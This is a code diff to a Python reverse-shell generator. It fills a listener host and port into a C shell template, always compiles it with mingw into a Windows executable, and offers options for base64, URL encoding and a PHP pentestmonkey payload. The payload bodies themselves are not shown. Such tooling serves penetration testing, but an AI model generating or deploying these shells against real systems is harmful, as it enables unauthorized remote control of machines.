@@ -172,9 +172,8 @@ class Reverse_Shell_Generator:
                       line = line.replace(Oragenal_port,LPORT)  
                       with open('./Store_shell/shell.c','a') as PHP_shell :
                            write_shell = PHP_shell.write(line)   
-                  if self.args.compile32:
-                     os.system("i686-w64-mingw32-g++ ./Store_shell/shell.c -o ./Store_shell/shell32.exe -lws2_32 -lwininet -s\
-                                -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")                  
+                  os.system("i686-w64-mingw32-g++ ./Store_shell/shell.c -o ./Store_shell/shell32.exe -lws2_32 -lwininet -s\
+                            -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")                  
                   os.remove("./Store_shell/shell.c")
                   print('[*] TYPE      : '+self.args.type +'\n' +'[*] LHOST     : ' +self.args.LHOST+'\n'\
                   +'[*] LPORT     : ' +self.args.LPORT+'\n'+'='*30 +'\n') 
@@ -232,13 +231,12 @@ class Reverse_Shell_Generator:
             parser.add_argument("-L","--LHOST"           , metavar='' , action=None  ,required = True ,help ="listner ip ' Local Host'") 
             parser.add_argument("-P","--LPORT"           , metavar='' , action=None  ,required = True ,help ="Listner port ")   
             parser.add_argument("-o","--output"          , action='store_true'                        ,help ="save the payload into the file")      
-            parser.add_argument("-B64","--base64"        , action='store_true'                        ,help ="encode the payload to base64 encode ")  
+            parser.add_argument("-B","--base64"        , action='store_true'                        ,help ="encode the payload to base64 encode ")  
             parser.add_argument("-M","--pentestmonkey"   , action='store_true'                        ,help ="genteate php pentestmonkey payload file ") 
             parser.add_argument("-W","--windows"         , action='store_true'                        ,help ="gentate reverseshell  for windows operating system ")
-            parser.add_argument("-C32","--compile32"     , action='store_true'                        ,help ="compile C code to exe executable 32 bit ")
-            parser.add_argument("-info"                  , action='store_true'                        ,help ="print all support type of  the rverseshell ")
+            parser.add_argument("-I","--info"            , action='store_true'                        ,help ="print all support type of  the rverseshell ")
             parser.add_argument("-F","--onefile"         , action='store_true'                        ,help ="genetate python script revelshell  ")
-            parser.add_argument("-UE","--urlencode"      , action='store_true'                        ,help ="encode url format ")
+            parser.add_argument("-U","--urlencode"       , action='store_true'                        ,help ="encode url format ")
             self.args = parser.parse_args()         
             if len(sys.argv)!=1 :
                pass
@@ -288,7 +286,4 @@ class Reverse_Shell_Generator:
                     print('[*] Support type is : ',i)       
                 exit()               
 if __name__=='__main__':
-   Reverse_Shell_Generator()  
-
-
-
+   Reverse_Shell_Generator() 
